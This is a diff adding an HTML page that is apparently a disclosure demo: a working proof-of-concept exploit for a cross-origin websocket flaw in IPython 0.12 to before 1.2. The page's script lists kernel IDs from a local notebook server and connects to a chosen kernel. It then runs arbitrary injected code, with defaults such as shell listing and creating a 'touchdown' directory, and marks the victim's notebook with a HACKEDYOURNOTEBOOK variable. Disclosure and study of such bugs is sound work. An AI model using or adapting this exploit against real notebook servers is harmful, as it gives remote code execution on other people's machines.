@@ -1,0 +1,137 @@
+<html>
+<head>
+<title>Kernels and Websockets</title>
+<meta charset="UTF-8">
+</head>
+<body>
+
+<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+<!-- Optional theme -->
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">
+
+
+
+<style>
+body {
+  margin: 20px;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+}
+</style>
+
+<div>
+<img src="IPy_header.png" />
+</div>
+<br />
+
+<pre>
+Note: This affects 0.12 ≤ IPython &lt; 1.2. It was fixed in time for IPython 2.0 (just prior to release).
+
+If you want to play along at home, install IPython 1.1
+</pre>
+
+<div class="alert alert-error" style="color: #c7254e; background-color: #f9f2f4; padding: 2px 4px; border-radius: 4px;"><strong>WARNING</strong>: By plugging in a kernel id, you are allowing this site to run arbitrary code on your system.</div>
+
+<hr />
+
+<div>
+<h3>Host</h3>
+<input type="text" name="host" id="host" size="45" value="127.0.0.1:8888" />
+</div>
+
+<div>
+<h3>Kernel IDs available via above host</h3>
+<iframe src="http://127.0.0.1:8888/kernels" frameBorder="0" width="600" height="40" id="kernel_list"></iframe>
+</div>
+
+<div>
+<h3>Choose a kernel ID to (ab)use</h3>
+<input type="text" name="kernel" id="kernel_input" size="45" />
+<button type="button" id="launcher">Launch!</button>
+</div>
+
+<div>
+<h3>Modify the injected code</h3>
+<textarea rows="4" cols="50" id="code" class="code">
+!date
+!ls
+</textarea>
+</div>
+
+
+<div>
+<h3>Feedback</h3>
+<textarea rows="4" cols="50" id="output"> 
+</textarea>
+</div>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+
+<!-- The bare minimum amount of libraries needed (without minimizing/extracting
+     functionality), to create kernels indirectly. -->
+<script src="static/base/js/namespace.js"></script>
+<script src="static/base/js/utils.js"></script>
+<script src="static/services/kernels/js/kernel.js"></script>
+
+<script type="text/javascript">
+
+$(document).ready(function(){
+
+  function displayOutput(messageType, content) {
+    if(messageType === "stream") {
+      $('#output').text($('#output').text() + content.data);
+    }
+  }
+
+  function remoteControl(kernel_id, code, host){
+      if(typeof(host)==='undefined') host = "127.0.0.1:8888";
+      if(typeof(code)==='undefined') code = 'import os; os.mkdir("touchdown")';
+
+      var kernel = new IPython.Kernel();
+
+      kernel.ws_url = "ws://" + host;
+      kernel.kernel_url = "/kernels/" + kernel_id;
+      kernel.kernel_id = kernel_id;
+
+      kernel.start_channels();
+
+      setTimeout(function(){
+            var callbacks = {output: displayOutput };
+            $('#output').text('')
+            kernel.execute(code, callbacks);
+
+            kernel.execute('try:\n  HACKEDYOURNOTEBOOK+=1\nexcept:\n  HACKEDYOURNOTEBOOK=1', {}, {silent:false, store_history:true});
+      },1000);
+
+  };
+
+  window.remoteControl = remoteControl;
+
+  $("#launcher").click(function(){
+    var kernel_id = $("#kernel_input").val();
+    var code = $("#code").val();
+    var host = $("#host").val();
+    remoteControl(kernel_id, code, host); 
+  });
+
+  $("#host").change(function(){
+      var host = $("#host").val();
+      window.host = host;
+      $("#kernel_list").attr('src', 'http://' + host + "/kernels");
+  });
+
+});
+</script>
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+              ga('create', 'UA-37362544-1', 'auto');
+                ga('send', 'pageview');
+
+              </script>
+
+</body></html>
